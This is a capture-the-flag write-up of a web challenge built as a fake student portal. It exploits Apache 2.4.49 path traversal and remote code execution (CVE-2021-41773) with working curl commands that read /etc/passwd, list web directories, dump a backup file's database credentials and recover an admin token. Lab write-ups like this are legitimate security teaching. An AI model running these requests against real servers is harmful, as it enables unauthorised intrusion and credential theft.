# L'Enigme du Code Apogee

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Web Exploitation |
| Difficulty | Medium / Hard |

The challenge presented a fake ENSA Beni Mellal student portal.

## Reconnaissance

Directory fuzzing revealed interesting endpoints:

```bash
ffuf -u https://csia-ctf26-ensa-web-challenge.chals.io/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt
```

Interesting results:

```text
admin                   [Status: 301]
backup                  [Status: 301]
cgi-bin/                [Status: 403]
```

The most important clue was the server banner:

```text
Apache/2.4.49 (Unix)
```

This version is known for the Apache path traversal vulnerability CVE-2021-41773.

## Exploiting Apache 2.4.49

I tested path traversal through `/cgi-bin/`:

```bash
curl -s --path-as-is \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

Then I confirmed remote code execution through `/bin/sh`:

```bash
curl -s --path-as-is -X POST \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo;id"
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE was confirmed.

## Enumerating the Web Directory

I listed the web root:

```bash
curl -s --path-as-is -X POST \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo;ls /var/www/html"
```

Output:

```text
admin
backup
icons
index.nginx-debian.html
index.php
robots.txt
```

The `backup/` directory looked suspicious.

## Backup Leakage

I listed the backup directory:

```bash
curl -s --path-as-is -X POST \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo;ls /var/www/html/backup"
```

Output:

```text
config.bak
```

Then I read the file:

```bash
curl -s --path-as-is -X POST \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo;cat /var/www/html/backup/config.bak"
```

Interesting content:

```text
DB_USER=etudiant
DB_PASS=123456

JURY_TOKEN_HASH=5e1ed8b7f3abcb9db4c1fd18fe17b5a1
```

The backup also contained a Base64 clue:

```text
# ZXR1ZGlhbnQ6MTIzNDU2
# base64 : etudiant:123456
```

## Valid Credentials

I tested the leaked credentials:

```bash
curl -i -X POST https://csia-ctf26-ensa-web-challenge.chals.io/ \
  -d "username=etudiant&password=123456"
```

The response showed a valid session:

```text
HTTP/1.1 302 Found
Set-Cookie: PHPSESSID=...
```

The account worked, but it had limited privileges.

## Hidden Admin Export

I enumerated the admin directory:

```bash
curl -s --path-as-is -X POST \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  -d "echo;ls /var/www/html/admin"
```

Output:

```text
export
```

I searched for token references inside the web directory:

```bash
curl -s --path-as-is -X POST \
  -d "echo;grep -R 'token' /var/www/html 2>/dev/null" \
  "https://csia-ctf26-ensa-web-challenge.chals.io/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

Output:

```php
/var/www/html/admin/export/grades.php:$secret_token = 'jury2026';
```

This revealed the token protecting the export.

## Accessing the Protected Export

```bash
curl "https://csia-ctf26-ensa-web-challenge.chals.io/admin/export/grades.php?token=jury2026"
```

The page revealed:

```text
FLAG=CSIA{G00d_LuCk_4t_3NSA_BM_2026}
```

## Flag

```text
CSIA{G00d_LuCk_4t_3NSA_BM_2026}
```

## Key Takeaways

- Apache 2.4.49 path traversal and RCE are highly impactful.
- Backup files can leak credentials, hashes, and operational secrets.
- Post-exploitation enumeration is often the difference between shell access and flag recovery.
- Hidden admin functionality should never rely on a hardcoded token.

## Attack Chain

1. Fuzz directories.
2. Identify Apache 2.4.49.
3. Exploit CVE-2021-41773.
4. Confirm RCE.
5. Enumerate `/var/www/html`.
6. Read `backup/config.bak`.
7. Find hidden admin export token.
8. Access the export and recover the flag.

